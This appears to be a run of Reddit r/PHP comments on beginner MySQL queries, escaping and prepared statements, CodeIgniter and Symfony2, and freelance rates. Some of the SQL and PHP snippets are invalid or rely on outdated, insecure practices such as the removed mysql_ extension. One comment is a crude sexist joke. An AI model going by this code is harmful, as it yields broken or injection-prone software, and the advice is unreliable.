&gt; say I wanted to list a directory of professors on a page, and I wanted to include firstName, lastName, and department. select * p.firstname, p.lastname, d.name from professors p, departments d where p.department_id = d.id when one professor can be only in one department, or select * p.firstname, p.lastname, d.name from professors p left join departments d on (p.department_id = d.id) when even a single professor can work in multiple departments. I would rename "id" field in departments table to "department_id", so as to hint more strongly that the keys in professor and deparmtents table are related. Also i would pluralize professor in the table name because departments' table name is already pluralized. The part in your code that seems wrong to me: if ($trimmed == "" and $trimmed2 == "") You should change it to: if ($trimmed != "" or $trimmed2 != "") If you're sorting the professors by average rating, you should use [wilson score](http://www.evanmiller.org/how-not-to-sort-by-average-rating.html)
Do you have a website and portfolio?
Aargh. I cannot edit my post. I'm a bit tired (4am here), so I make mistakes. I haven't tested the first advice, but I have a hunch that the "left join" part is the only working one. You will find out when there's multiple professors in the same department. Also the code correction part is wrong. The right solution is to change $var = @$_GET['firstName'] ; $var2 =@$_GET['lastName']; to $var = @$_POST['firstName'] ; $var2 =@$_POST['lastName']; That's it. I'm off to bed.
recruiters are scum.
Sent you a DM. Thanks.
a good local working environment with a separate database and xdebug properly configured in an ide that supports it. Ctrl-S, var_dumps, and developing on a remote system will slow you down substantially. And of course php.net
Awesome! Thanks a lot! I got my directory up and running with the three columns. I'm still not quite sure how to make each professor have an individual page to display their ratings, but I'm slowly learning everything else thanks to you guys!
What's your rate?
Bind your freaking parameters. Problem solved.
Agreed. All recruiters have ever done for me is waste my time.
if you are going to ditch your current schema you might wanna look into an ORM, makes a layer of abstraction between MySQL and PHP. You might wanna look into one anyways, because i think Dealing with objects is much easier than dealing with raw sql and its results. They generally just make your life easier... check here if you are interested... http://stackoverflow.com/questions/108699/good-php-orm-library
r/forhire Post your portfolio here
a recruiter couldn't get Sergei Brin a job
Send me a link as well. I don't need any work done right now but maybe months down the line. I run my own small business and do all my own development using PHP, jQuery, eBay, and Amazon APIs so that skillset may be useful if I ever need a second hand.
Here in Austin, the recruiter's I work with get a headhunter's fee from the contracting company, not the contractor. Some of them aren't great, maybe, but having several sending you potentials is better than nothing.
Hey, thanks! Didn't know about that one. :)
That probably means they have a few boxes that are off their meds. [here is the source code for the easter egg logo](https://github.com/php/php-src/blob/master/main/logos.h#L495). If I could do a codesearch on github or their svn without pulling their actual repo I would link to the line that figures out exactly what day it is to display the php logo a certain way, but alas, I cannot! 
Yeah, sorry, I should have been more clear. I'm a freelancer. I rather enjoy working a regular work week, having an office with a window, time to play fetch with my dog, and time to spend with my family. When I worked a cubicle-based employment job, I was miserable -- required 70 hour work weeks, went home angry, had no chance of ever getting an office, let alone a window, let alone anything but half-walled cubicles, and wasted several years of my life to the point my wife almost divorced me out of lack of attention, and my kids almost disowned me. When I became a freelancer, it saved my life. It saved my marriage, I reconnected with my kids again, my dog no longer thought of me as a stranger, I became a lot happier, my weight returned to normal, and my health improved dramatically. So, there's no way in a million years that I would ever call a recruiter ever again. Besides, I have found over the years that I'm a better salesman of myself than anyone could ever be. Now I get to use my favorite tools, skills, strategies, and methodologies, rather than what the employer wanted.
Why don't you try [vWorker (previously known as rent a coder)](http://www.vworker.com/) and [Free lancer](https://www.freelancer.com/) ? I use both and they are very good even though I haven't landed my first job there (I'm not taking it too seriously even though I got some clients interested and I'm not as experienced as you are).
I don't recommend these unless you work in a third-world or near-third-world country. The pay rates just aren't suitable for USA developers.
I've seen a lot of 1k $ projects for around a week of work if the developer is experienced and know what he's doing. Is that too low? sorry to ask but what kind of rates do you get in the US of A? I live in a 5th world country :P (Lebanon) and I find projects are *very* good. 
Join #kohana on Freenode and ask around. There's usually a bit of work hanging around for a good developer. 
odesk.com
1k for 40 hours ($25/hr) of work would be on the low end for contract work, but is better than nothing. The pay rates vary a lot by state, but most devs should be earning at least 60k, which would be $30/hr. Contract work usually pays a bit more because of no job security and the overhead in arranging and looking for work.
Rather than opening a new connection every time you do a query, you should open a single connection the first time you do a query and (optionally) close it at the end of the request. You also might want to try passing $link to to mysql_query as the second parameter. And I might be wrong, but I believe you need to list the fields you're inserting in your INSERT statement if you're using the VALUES syntax: INSERT INTO comments (id, email, body, created, modified) VALUES (NULL, "", "", CURDATE(), CURTIME()) Obviously replace these names with your actual field names. You can also omit the ID field and value if you just wish for it to auto-increment. This shouldn't cause an access denied error, but you'll probably run into this problem later.
&gt;I'm not sure why the insert statement is wrong (it's not supposed to be empty values), but that's a different issue I'm not immediately concerned with. The reason for this, is that `mysql_real_escape_string` needs an open database connection. There is none, because you keep closing it. I'm not quite sure why it won't connect, but as Farsightxr20 said, there's no reason to open and close that many connections. Try just opening one connection. If you're not too concerned with micro optimalisations, have PHP automatically close the connection. I'd also advise you to use Mysqli (which also has functions like `mysqli_query()`) or PDO (which is object oriented only).
Seems like you need to start writing a blog about freelancing 
I'm pretty sure I only need to name the columns in mysql if I'm omitting some, which I'm not. If that's illegal then it was working anyways for me earlier, and I'm pretty sure I read that explicity in the manual as well. I'm not sure what you mean by opening a connection for every query, well.. I kind of do, but not fully. As it currently is I'm only do a single query per request, so it does work out that way, but if I wanted to have a persistent connection object across requests how would I do this? I'm guessing this might make use of super globals? I really don't know what they are in detail, but I assumed those still did not persist across connections. 
Around where I am, an agency typically charges $200+/hour, while a freelancer will make $50-100. All of these rates would be considered very reasonable. On the other hand, a one bedroom apartment will run you about $1,100-1,600 a month.
Did not know mysqli existed, thanks. How come mysql functions have not been deprecated in favor of mysqli? I'm open to doing as you guys suggest, keeping a persistant connection, however I don't know how to do that exactly. Would the script just verify that a connection exists each time and use that if available, otherwise create a new one? So essentially what would probably happen is the connection would never be closed unless the server is restarted or I set it to close after not being in use for a certain amount of time, something like that? How do I store an object across different sessions?
what happens if you change the table later to have an extra automatically filled field? e.g. a date_update that isn't in your code? It's bad practise not to include the field names. It will also stop you from making mistakes in ordering of varibles. 
I assume you're right since this is my first time using sql, but what would happen is the query would fail, isn't that what I'd want to happen? If I later changed the sql table then I'd also have to change my insert statement regardless, no?
not always. Some times I've added a date field to a table that i can see when an insert happened but not need to update the code.
Well, $1K for a week's worth of work is pretty decent. Actually I need around $1300/wk in order to make it on my finances, minimum. Guess I need to steer back to these sites. It's just that I've typically seen that either the requirements were ridiculous for what they needed ("I need a clone of YouTube in one week") or the pay rate was pathetically low. On the good ones, there were like 80 responses from agencies. I can't compete with agencies -- they have far more borrowed code from other projects ready to go, more guys who might fill the niche, etc. Eventually I gave up. 
$1000 pays the bills though. As a business owner I can say that sometimes at the beginning you need to do some cheaper work to get your through things, but as time goes on your experience and relationships will improve your ability to make money greatly.
Connect to the DB at the top of your file, and forget about it. You shouldn't be writing any script that runs long enough for a closed connection to be an issue. If it does fail in the middle, there's probably more going on with your DB than your code can recover from. Also, ditto on the above comments regarding naming your fields for insert. When I encounter code like that, I'm mentally strangling you from a distance. You don't want legions of programmers sending you negative vibes like that, it's just not worth it. :)
One thing to add: Make sure that you use mysql_real_escape_string on any variable before using it as a string in a SQL query. $name = mysql_real_escape_string($_GET['name']); Otherwise everything will go to hell when someone puts in a name like "O'Donnell": if they're doing it innocently, the query will just fail, and if they're doing it maliciously, they may be able to compromise your database or even your application. Others will chime in to suggest using mysqli or PDO and prepared statements, both of which will solve this problem, but I'm too lazy to explain how so I'll leave it to the chimers.
[Scroll down to 'What is PHP's mysqli Extension?'](http://php.net/manual/en/mysqli.overview.php). It's not deprecated, but Mysqli is strongly recommended. PDO is a good choice as well, since I like its methods better. Opening one connection per script and using persistent connections are two different things. A persistant connection is, as like you said, never closed. They have their uses, but most of the time, they won't improve (or even hamper) performance. A single connection per script is closed as soon as PHP is done with it. For example: &lt;?php $db = new Mysqli("..."); // or mysqli_connect() $result = $db-&gt;query(); // or mysqli_query() $stmt = $db-&gt;prepare(); $result = $db-&gt;query(); // End of file: PHP closes the connection. // If you want, you can call $mysql-&gt;close() / mysqli_close(). // http://php.net/manual/en/language.types.resource.php#language.types.resource.self-destruct
&gt; I'm not sure what you mean by opening a connection for every query, well.. I kind of do, but not fully. As it currently is I'm only do a single query per request, so it does work out that way, but if I wanted to have a persistent connection object across requests how would I do this? I'm guessing this might make use of super globals? I really don't know what they are in detail, but I assumed those still did not persist across connections. The easiest way (not the prettiest) would be to use a singleton-like factory: abstract class DB { private static $conn; public static function getConn() { if(!self::$conn) { self::$conn = mysql_connect(blah blah); } return self::$conn; } } Then just call DB::getConn() whenever it's needed. PHP will automatically close all open connections at the end of execution, so you don't really need to worry about closing. This will save you the overhead of connecting every time you need to run a query. Also, this only persists until the request finishes. It's possible to have connections that are persistent across requests, but I don't recommend it because it can cause issues with multi-threading or load balancing (if one request is executing a long query, a simultaneous request will have to wait for it to finish).
What if the order of the columns are changed? You may drop a column then add it again at the end of the table. You may end up with data being swapped in password and username columns, for example.
&gt; the query would fail, isn't that what I'd want to happen? If you add a column to a table that is handled by default values or triggers or other code, then no, you certainly do not want the existing queries to fail. Another way of looking at it: if you need to add a column for some reason, can you be sure you have found and updated (and tested) *every single* query and line of code that touches that table throughout your application? Really sure?
Thanks, I'm going to clean up my code later today and will incorporate that. Seems my question has been answered, and my site is now up ([www.brettsprouse.com](http://www.brettsprouse.com)). It's still got some major bugs, but I know how to fix them, just can't do but so much in between 5min. breaks at work. Please don't hack my site reddit, it's def. possible at this point, though probably not *too* easy :3.
Both good points, I'll make note of this in the future. 
I'm using Google Chrome extension PHP Console https://chrome.google.com/extensions/detail/jafmfknfnkoekkdocjiaipcnmkklaajd IT'S AWESOME!!!
Sounds like somewhat of an advanced suggestion. He should get himself accustomed to a single framework before trying out others because there could be a feature that makes one better than the other and you would have no idea unless you spent some significant time with one.
Google some codeigniter examples - make yourself a website with it, maybe a photo gallery or something. Sometimes it's rough to get good ideas, so just make a website that you've seen before as an exercise, and not with the final goal being to put it online for everyone to see. 
&gt; I'm pretty sure I only need to name the columns in mysql if I'm omitting some, which I'm not. If that's illegal then it was working anyways for me earlier, and I'm pretty sure I read that explicity in the manual as well. Seriously, trust everyone on this. One day down the road the columns in your database will change and you will get some subtle bug that will cost you hours to track down (and possibly screw up your data). Easier to spend 10 extra seconds typing now.
Furthermore it really is not much additional effort, there really is no reason not to
Truthfully I think the mysqli functions should be considered deprecated too. It's just so much easier and safer to use a higher level library like Flourish (http://flourishlib.com/docs/fDatabase) or even PDO if adding a whole big library isn't your thing. edit: Sorry, I really don't mean deprecated, I just mean that there are other better options available!
Query Failed: **Access denied** for user 'www-data'@'localhost' (**using password: NO**) Whole query: INSERT INTO comments VALUES (NULL, "", "", CURDATE(), CURTIME()).
This is because the database driver PHP is using "assumes" that max varchar can be is 255... Ran into this in my professional work... We use MSSQL, and the default mssql driver is based off the assumption that varchar's can't be more than 255, and treat them as such... in fact my values were TRUNCATED to 255 chars... We switched to MS's version of the driver and it then began to work with values &gt; 255 chars EDIT:: IMISREAD... old versions of MySQL only support varchars &lt;= 255 chars!!! 
Yeah, that's perfect because there's an "O'Neill" in the database that I was just writing as "O Neill", so that should help! One more question, I have the following script encapsulating my login script, so if the user is logged in they won't see the login form. The only problem is that the die() function kills the login, ALONG with everything after it, so my footer is gone as well. Surely, I have implemented it wrong, I have tried to add an else statement afterwards but nothing I am using seems to work. It's probably a simple fix. I should also note that this login form is in a sidebar, so I don't know if that has an affect on it: &lt;?php if (!isset($_SESSION['auth_userID'])) { if (!isset($_GET['register'])) { //to register no need to be logged in ?&gt; &lt;h2&gt;Login&lt;/h2&gt; &lt;form name="login" action="index.php?login" method="post"&gt; &lt;input name="username" type="text" class="textfield" value="Username" /&gt; &lt;input name="password" type="password" class="textfield" value="Password"/&gt; &lt;input type="submit" name="login" value="Submit" /&gt; &lt;/form&gt;&lt;?php } die(); } ?&gt; //Other sidebar code goes here, and the footer down below 
Don't store the open tab in the session var... store it in a hidden input in the tab's page that is sent along with everything else?
How about putting the footer code in a function? Then you can call it in the login clause, as well as calling it at the bottom of the main script.
You're right, mysqli is recommended instead of mysql by the core developers.
Line 721-736 of fDatabase: 721 case 'mysql': 722 723 if (extension_loaded('mysqli')) { 724 $this-&gt;extension = 'mysqli'; 725 726 } elseif (class_exists('PDO', FALSE) &amp;&amp; in_array('mysql', PDO::getAvailableDrivers())) { 727 $this-&gt;extension = 'pdo'; 728 729 } elseif (extension_loaded('mysql')) { 730 $this-&gt;extension = 'mysql'; 731 732 } else { 733 $type = 'MySQL'; 734 $exts = 'mysql, pdo_mysql, mysqli'; 735 } 736 break; Looks to me like it just uses mysqli anyways.
It sure does. But it's (if you wish) database agnostic as well as always properly escaped for you. I like the syntax too. I amended my parent post over the use of the word deprecated.
Plain text doesn't have anything that gets executed, so you can throw any old thing you want in it. With html, it depends on what you are doing. If you are emailing something a user has submitted, then use htmlentities on the user submitted info. Everything else goes in as normal html.
I'm confused about what you are worried about. Are you worried that whatever email client your users are using might interpret something? If that is the case, I do not think it would be feasible for you to escape all possible special characters which might be interpreted by the different languages that those clients are written in.
Your database is flawed because there is no "hotness" category. I can't pay attention in class without perky titties to look at.
I think it's definitely feasible. Wrapping the output in htmlspecialchars or htmlentities (depends on what charset is being used to form the message) should be exactly what the submitter needs to form a proper HTML mail message. For plain text, just send it as-is, unescaped. (Make sure your charset is correct here for the type of user input you accept.) Don't forget about unicode control characters that flip the text around and do all sorts of weird stuff. You might want to strip those out... edit reason: Just finishing my post.
Maybe I was unclear. I thought we were only talking about plaintext. The whole point of escaping html special characters in user input was so the html formatted email would display correctly. What could you possibly need to escape if you are only displaying plaintext? In my earlier post I was toying with the idea, that if you were worried about the web mail client interpreting certain characters then sure, but that was not the case. Also when you edit a post you should explain yourself :).
&gt;Don't forget about unicode control characters that flip the text around and do all sorts of weird stuff. You might want to strip those out... I've seen people do some pretty interesting stuff with those unicode control characters. Even plain unicode text needs to be analyzed.
 $string = filter_var($string, FILTER_SANITIZE_STRING); http://php.net/manual/en/filter.filters.sanitize.php
Bullshit, basic security is easy and you should get into the habit of doing it wherever you go. Sanitise inputs (`filter_var()`), use prepared statements, and limit input (so make sure the rating field is 0 &lt; x &lt; 5 or whatever). And instead of what you put there, use: $sth = $pdo-&gt;prepare("select * from professor where firstName like :trimmed or lastName like :trimmed order by lastname"); $sth-&gt;execute(array( ':trimmed' =&gt; '%' . $trimmed . '%' )); Don't mean to be harsh, but start out with good habits.
If you're going to start denormalising like that, you may as well jump into full blown NoSQL. Use RDBMSs for their strong points, and normalisation is one of them. Unless you have an absurd number of users, it will suffice if done well, and even then you can probably use memcached before re-architecturing into NoSQL, which can be a pain, especially for a newbie.
&gt; select * p.firstname, p.lastname, d.name from professors p, departments d where p.department_id = d.id Joins were made for this SELECT * from professors p LEFT JOIN departments d ON d.id = p.department 
What's with the @ all the time. Notices can go fuck themselves, @ just encourages sloppy error handling.
My error reporting in php.ini is error_reporting = E_ALL &amp; ~E_NOTICE &amp; ~E_STRICT so i don't have to use @ with arrays to suppress the index error. I didn't even see it, before you brought it up. IMHO, if you have E_NOTICE on, it's a looks a lot nicer to use $var = @$_POST['firstName'] ; than if (isset($_POST['firstName'])) { $var = @$_POST['firstName'] ; } or heavens forbid, if (isset($_POST['firstName'])) $var = @$_POST['firstName'] ; but i suppose it's a matter of preference. Thanks for the tip though. I will seriously consider using the @ -syntax if I ever turn E_NOTICE on again. 
I don&amp;amp;#39;t think that&amp;amp;#39;s the right approach.
Well it's fine for HTML, and you can play around with other flags to disable/enable filtering of low/high characters.
Send one my way if you'd like. The company I work for is looking to build up a small list of good developers we can call on to get things done when the time comes.
What about strip_tags() - you can specify which html tags should be allowed.
Ugh, I hate these 'rate my prof' sites. First of all they don't actually tell you any information that's useful about the professor or the class. Success rates are tied to way more than "Is the teacher easy or not" We put thousands of hours into generating in-depth reports on this subject and your 3 minute analysis of the facts tell you nothing. You get people taking classes with terrible teachers, learning nothing as a result. Second, they hound institutions under threat of lawsuit for information that while may be a matter of public record *isn't* something that institutions collect and report on, so it ends up being hundreds of man hours to put together a report for rinky dink sites that only use it so kids who know they don't belong in college can look for an easy A. I happen to work in a college institutional research office and it's been my absolute displeasure to put together these horrible things for Pickaprof, ratemyprofessor and some other site that some pickaprof person who left to start his own decided to put together. We put zero weight on such requests so those sites wait months for the data and we've considered levying heavy fee's for the work. We've got far more important things to worry about, especially with the budget crisis, than to worry about putting together data for sites like that. Understand that putting together these requests takes time and the people tasked with doing it are not happy about wasting the time on it. You get bad data and I've been known to make sure it's in as obscure and shitty a format as possible. EDIT: Success rate reports are public record and are easy to obtain from any college. Students should be looking at those.
No hg? :(
&gt; Autoscale up and down without any fuss; Orchestra is **built on Amazon's proven infrastructure.** Proven to fail? edit: Still, cool to see the PHP ecosystem catching up to some of the others for cloud setups.
If you're outputting unknown content to HTML, and the unknown content isn't meant to be able to contain HTML, then htmlspecialchars() is your beast. There is a much uglier problem coming down the pipe for you. You mention internationalization. Email came before there was much of an acceptable internationalization standard for a surprising number of major languages, most importantly Russian, Japanese and Chinese. You will face half a dozen non-unicode encodings for Mandarin alone. You _absolutely_ _must_ acquire and unit test against samples of languages in various encodings as early as possible, or fixing the result will cost you the entire rest of your and your children's lives. It will take double-forever. You will watch the heat death of the universe during a build push. 
Unless your database has a city column that'll let you match an area code to cities, I don't think you'll be able to get what you want in one query. To get all ZIPs in the state a given ZIP is assigned to, along with the corresponding City and State information, use: SELECT Zips.ZipCode, Zips.City, Zips.State, AreaCodes.Code FROM Zips WHERE Zips.State = (SELECT Zips.State FROM Zips WHERE Zips.ZipCode = ?) Given a ZIP, to find all the other ZIPs in just its city, use: SELECT Zips.ZipCode, Zips.City, Zips.State, AreaCodes.Code FROM Zips WHERE Zips.City = (SELECT Zips.City FROM Zips WHERE Zips.ZipCode = ?) Given a ZIP, to find all the area codes in its state, use: SELECT AreaCodes.Code FROM AreaCodes WHERE AreaCodes.State = (SELECT Zips.State FROM Zips WHERE Zips.ZipCode = ?)
You should probably pray to the SQL gods instead.
I was discussing both plaintext and HTML (hence the original title ;)), and it's things like the unicode control characters your parent mentions that I was imagining when I asked the question. I was completely unaware these existed!
Unicode control characters. That about sums up the kind of stuff I was worrying about with plain text. Thanks for putting a name to it so I can look into this further. :)
Thanks but it's still not returning all available zips for cities with multiple zip codes. Personally my city only has one zip but I used to live in a city that had at least two that I was aware of so I'm using that to test. It's still only returning the zip that is entered into the form.
He has a join in the where clause (tho I prefer to do it your way)
&gt; "fixing the result" You sound like you have experience with this... Any particular pitfalls to watch out for? Any good references you've used for sorting all the encodings out?
Will definitely take your suggestions and crosspost at r/mysql!
This looks like it should work. Like phantom784 said, you might try rewriting your join with the full notation, but I don't see any reason that what you have now wouldn't produce the result you're expecting. Am I understanding you correctly that it's giving you everything BUT the correct selection? Also, may I ask where you got the zipcode data from? That could be handy to have.
Edited my post above, realised that the original SQL I wrote probably wasn't what you wanted.
We haven't learned the full notation to do joins yet. So far we were taught to do them the way I was writing in my initial query. I tried phantom784's method and I'm still getting the same result. The data is on a server that our instructor set up for the course. I'm sure he got the DB from somewhere online, but where exactly I have no idea. The two tables I need are the Zips and AreaCodes tables. Zips contains the Fields ZipCode, State, and City. AreaCodes has three fields. The only two that are pertinent to the results I need are Code and State. I'm joining the tables at using the State fields from each and displaying the rest of the associated data. But so far this method isn't displaying all associated zip codes for the city.
I think I see what you're getting at. I'll try it out. 
&gt; this method isn't displaying all associated zip codes for the city. Wait, back up, what data are you expecting to get out of this? As your query is written now you should only be getting one zipcode back from the database, the one that matches your zipcode. Are you trying to get all the other zipcodes associated with that city? edit: if you meant to say area code, well then the problem here is that since you're joining on the state column, it's going to return every area code in the state, not just for the city.
Relax, man. I'm doing it as a class project to learn more about website development, HTML, PHP, MySQL, etc. It is not going to be published, it's only on localhost. As far as not providing any useful information about the professor, what would you suggest I add to it to fulfill your ideals? I can always remove "easiness", as I, too, find it to be a faulty category. 
Something like this... SELECT z.ZipCode, Z.City, Z.State, GROUP_CONCAT(z2.ZipCode) AS zipcodes FROM Zips AS z INNER JOIN AreaCode AS ac ON z.State = ac.State INNER JOIN Zips AS z2 ON ( z2.State = ac.State ) WHERE z.ZipCode = ? GROUP BY z.ZipCode In theory it should return all zipcodes as a comma seperated list. NB - totally untested.
This is what we were given: &gt;Take the walkthrough code for the zip codes and integrate it with the area codes tables. So, if you look up 08080, it gives you back Sewell, NJ. It should also give you the possible zip codes for Sewell (all possible NJ area codes). I'm interpreting it as input a zip code into the form and it should give back the city, state, associated zip codes and all area codes for that state. I m not sure what the relevance of all the zip codes for the state has, but unless I'm interpreting the above instructions incorrectly, that's what he's asking for.
Does it need to pull all at once or vary depending on the form params? Am at work so don't have access to a db to test this but it will be something like this... First worry about getting the query to run in the db. Once it is returning the correct results, plug it into your php script. This returns the zipcode, state, city for the given zip SELECT z.zipcode, z.state. z.city, a.code FROM Zips AS z WHERE z.zipcode='zipcodehere'; This fetches area code but the problem is you'll get duplicate data due to the stupidity of the db schema you've been provided. The left join combines assumes you may not have a matching row in the other table so it returns NULL if no match. If you know 100% there is a matching row use JOIN instead of LEFT JOIN. SELECT z.zipcode, z.state. z.city, a.code FROM Zips AS z LEFT JOIN Areacodes AS a ON a.state = a.state WHERE z.zipcode='zipcodehere'; To fetch the same cities with that zip you will need to do a join. Depending on the size of the db this could be a bit of a performance hit.... SELECT z.zipcode, z.state, z.city, z2.zipcode, z2.state, z2.city, FROM Zips AS z LEFT JOIN Zips AS z2 ON z.city = z2.city WHERE z.zipcode='zipcodehere';
Sorry, don't mean to personally attack you. I go blind with rage when these sites are brought up due to the huge mount of my time they waste. Success rates take a lot of factors into consideration but generally look at the program as a whole considering many of the choices of what is taught and how it's taught, are agreed upon at the program level as opposed to individual class level. At a class level your options are limited to a base assessment of the teachers skill, the available text book(s) (*approved on a program level usually*) and the teachers attitude. 'easiness' is a subjective rating system that is based on the persons perspective and the individual class experience. It'll eventually average out to a possibly somewhat accurate assessment of the ease of the course. But only after a LOT of data to smooth out issues like * Personality conflicts * Whether or not the class is a sports requirement and thus you've got 20 asshole baseball/basketball/football players fucking up the class and stressing out the professor * budget issues. * etc. I would suggest rating the textbook(s), the assignments, the professors attitude and the overall stress level of the course. These are the things actual students complain about. Combined you might get a better idea of just how easy the class would be. Indicating whether or not tutoring is available for that course might also be a relevant piece of data to capture. Some colleges have supplemental instruction for individual courses which greatly improve success rates.
well, youll need also a male/female category also..
I haven't tested this, but I think this should let you do it in one query: SELECT z.ZipCode, z.City, z.State, a.Code FROM ZipCodes z JOIN AreaCodes a ON a.State = z.State WHERE z.State IN ( SELECT State FROM ZipCodes WHERE ZipCode = ? ) OR z.City IN ( SELECT City FROM ZipCodes WHERE ZipCode = ? ); You just need to bind the ZipCode twice.
?
It's a reserved word, but not a reserved variable name... you know, because of the dollar sign, the only reserved variable name is $this. Anyways, I would just name the variable $c instead, because I have a sneaking suspicion you would rage even harder at single-letter variable names.
i know the variable name isn't reserved. My point is that it is still confusing $POST isn't a reserved variable, but it is still a bad variable name. It can be very confused to skim over, and if youre talking to someone about your code, your variable called $POST would be confusing in conversation. $class is the same deal. it works as a variable but it's still confusing. "hey what class is $class?", and oh if your make a class called "classs" and instantiate it and assign it to the variable $class then what the fuck. You see now how it's not about what the language technically allows you to do, it's about readability.
Those are excellent suggestions, thank you very much. I will definitely implement them :) That criteria is greatly improved over what I was thinking, and it makes a lot more sense from an academic perspective, especially in that it creates a fairer atmosphere for both students and professors that would hypothetically use the website!
I had to make a few changes to what you have here but you pretty much nailed it. I changed "OR" to "AND" because it was giving me cities in other states with the same name. Plus I fixed some of the table names to alleviate confusion. Just tested in the DB and it works perfectly! Thanks a million! Our book is really not clear on joins, and omits sub-queries altogether, so this was a HUGE help!
I'm just starting out on a Symfony2 project and wanted to apply some basic best practices. This made it very simple to get the continuous integration up and running.
Symfony2 is looking to be a really really good PHP framework. Once the stable release is out, I think they are going to see an explosion in popularity. It has everything I want in a framework except for one thing, a stable release. *crosses fingers*
Widget/sidebar support of some kind would be another nice feature. Is this for a school project or just for fun? 
Just for fun! I've already coded up a "Recent Posts" widget, the code is pretty much in place for a "Releated Posts" widget too.
Very impressive, keep up the good work! I am loving the minimalism, but I think it would be cool if you added a basic admin interface that has a stats system (with graphs and stuff).
Thanks! The CMS is on the way, I'll look into adding a few stats!
Would it be worth trying to get into Symfony 1 or better to wait for 2? I've stuck with Cake simply because I've used it before and it seems there's never enough free time at work to give trying a new thing a proper shot.
Excellent stuff! I am going to download this and see if I can use it on my site. BTW, TIL about Disqus!! How long was I away from the internet? I think it's really cool!
What does "SB" stand for? Small Business?
If you have any problems drop me a message!
No need to wait, start getting into Symfony2 now. I would not bother learning anything about Symfony 1 beforehand, any generic web framework experience will suffice. Start with the Symfony2 Book, it's pretty darn good already: http://symfony.com/doc/2.0/book/index.html
Nice design. I'll be digging through your source to see how you did the AJAX integration, if you don't mind. :P
[Sebastian Bergmann](http://sebastian-bergmann.de/).
SB stands for Sebastian Bergmann — a major force in the PHP community when it comes to demonstrating, helping with and enforcing good code. Author of PHPUnit, and a whole bunch of other great tools, check out his public [github repos](https://github.com/sebastianbergmann). And an awesome guy who loves desserts ;)
How long did it take you from the time you first picked up a PHP manual or whatever to get to being able to do this? Blog it! :)
From a UI perspective, I was expecting the 'top-bar' dropdown element that appears when you scroll down to respond to a click event. Perhaps the window would scroll to the top of the blog or link to a particular post/section when clicked? Just a suggestion, great job overall though!
Very slick, been thinking of doing something like this to learn CI. Did you know CI before you started? If I ever get to figuring out Git, I might try use your code to help me learn if that's cool?
Nice! Just a quick look: * In the blog controller if you set the function to: "function index( $page = '0')" you will not need the if isset bit. I think, not got a dev enviroment to test. 
I don't mean to piss on your parade or threadjack, but I have an honest question. I've tried out many of the frameworks out there. The only one I don't really have a lot of experience with (as a framework) is Zend. Why do people use Kohana/CI? It seems like there is so much more code writing involved when compared to Symfony/Cake. I realize that this adds or potentially adds overhead, but using Symfony/Cake, my development time is so much quicker than Kohana. Am I missing something? I've been looking for an alternative to Symfony for a while (a balance between Symfony and CI, really), but it feels like I'd have to sacrifice too much framework functionality.
Your inconsistent indentation and commenting really bugs me but I'm a crazy person when it comes to coding style so don't listen to me. Overall I love what you've done. Keep it up! I agree with the other dude who says you should make an administration side. 
Very nice, love the simplicity of it. I might integrate it with my personal portfolio! Keep it up!
I'm a Kohana developer so my opinion is biased. A framework should aspire to providing a clean interface for you to write object oriented code then get out of your way. Kohana for example only requires a controller method then everything else can be ignored you can safely echo straight html from there no other magic required. Now the extra magic of Kohana is with the cascading file system transparent class extensions and class auto loading. Once you plugin a few community supported modules you have a few choices for an orm library, logic-less templates, and unit testing. 
Nice work, I really love the infinite scrolling, that's a feature I've been meaning to add to my homemade blog "engine", [BLACK](http://github.com/ZaneA/BLACK).
I spent a lot of time assessing a number of PHP frameworks, and, apart from some technical points, it was the quality of the Symfony 2 Book that finally swayed me. It is very clear and concise, lots of examples and a nice progression. Other frameworks had more documentation, but they did not reach this level of quality. 
CodeIgniter put TFM in RTFM. Seriously, if you need to find out something about CI, it's in there. Best documentation, bar none, for a framework I have ever seen. Kohana is more cutting edge than CI. It will always have more features. But what it doesn't have is one guy who's willing to play benevolent dictator and provide some stable control over development. There are no surprises in CI. Symfony and Cake have probably matured somewhat since I last looked at them several years ago. But now that I've been doing CI for a while, I see no reason to change for the sake of change. I'm comfortable with CI and can make it do what I need it to.
I would stick with Symfony. Symfony2 is looking like an excellent framework.
Take a look at: http://blog.laurencedawson.com/js/index.js
Thanks, I'll add these to the todo list.
Ah yes. I think that would work, thanks.
I knew a bit of CI, been tinkering for a while and decided to try to make something from scratch. And go ahead!
Exactly, the documentation is fantastic.
Ah tell me about it, I started using the editor [Kod](http://kodapp.com/) and its driving me mad too. I need to switch back and do a indentation tidy up!
Thanks!
I'm a bit worried it looks like [dickbar](http://dickbar.org/). Any suggestions or just remove?
Cool, just something that I instinctively expected when it appeared. Again, nice work!
I'd use this (do I'd tap that rule apply here? )
Very nice, indeed. 
This is brilliant. I love the simplicity.
Looking at your source code I noticed in both your models you have this: function __construct() { parent::__construct(); } Just a minor nitpick, but this is unnecessary. You only need to manually call the parent constructor if you have a constructor in your model. As you're not doing anything in your model's constructor, you can remove the method completely. Because its a child class "blog_model **extends** CI_Model" it will call the parent's __construct method unless you've overridden it. Also, you can roll some of your simpler methods into less code, for example: $this-&gt;db-&gt;order_by("id", "desc"); $this-&gt;db-&gt;limit($limit, $offset); $query = $this-&gt;db-&gt;get('blog'); return $query-&gt;result_array(); becomes this: return $this-&gt;db-&gt;order_by('id','desc')-&gt;get('blog', $limit, $offset)-&gt;result_array(); The limit is wrapped in the -&gt;get() method and the entire thing is just returned. 
Symfony2, to me, seems like a paragon of over-engineering.
I'm really curious to see the adoption rates. On the one hand, Symfony2 will definitely attract hard-core object-oriented PHP developers, since it's an extremely well designed and flexible framework. On the other hand, I think Symfony2's verboseness (compared with other frameworks) and minimal amount of "magic" will likely discourage the more inexperienced developers.
I think this might be one of the best advantages of Symfony2. The contributed code will be at a higher standard because of the lack of inexperienced developers. Symfony2 makes it really easy to distribute modules of code too, with the whole bundle thing. The barrier to entry is almost like a spam filter. (I've heard arguments like this for Python before...)
Thanks, I'll make these changes tonight
### No. The world does not need another low-quality "here's how to use the decrepit `mysql` extension!" so-called tutorial. It starts users down the road of *worst practices*. This pathetic excuse for a "tutorial" is amongst the worst offenders I've ever seen. It's useless and entirely without context or reason for existing, and you should be entirely ashamed of yourself for even thinking of submitting it here, no less writing it. It's bullshit like this that gives PHP the reputation it has. ... Sorry, I just needed to get that out of my system.
